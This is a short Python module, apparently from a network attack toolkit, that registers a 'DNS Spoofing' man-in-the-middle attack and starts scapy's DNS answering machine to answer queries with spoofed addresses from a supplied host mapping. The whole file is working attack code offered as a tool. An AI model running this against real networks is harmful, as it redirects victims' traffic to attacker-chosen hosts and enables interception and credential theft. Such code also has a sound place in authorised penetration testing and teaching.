from scapy.layers.dns import DNS_am
from libs.aux_funcs import type_wrapper, attack_cat, attack_layer, attack_type, EXIT_SIGNAL

@type_wrapper(name = "DNS Spoofing", type=attack_type.MitM, category=attack_cat.Attack, layer = attack_layer.L4, arg_list=[])
def dns_spoofing(args):

    dns_server = DNS_am(joker6 = False, match = args["dns_hosts"]['dns'])

    dns_server()
    print("DNS service started")
    input("Press Enter to continue...")

    return

    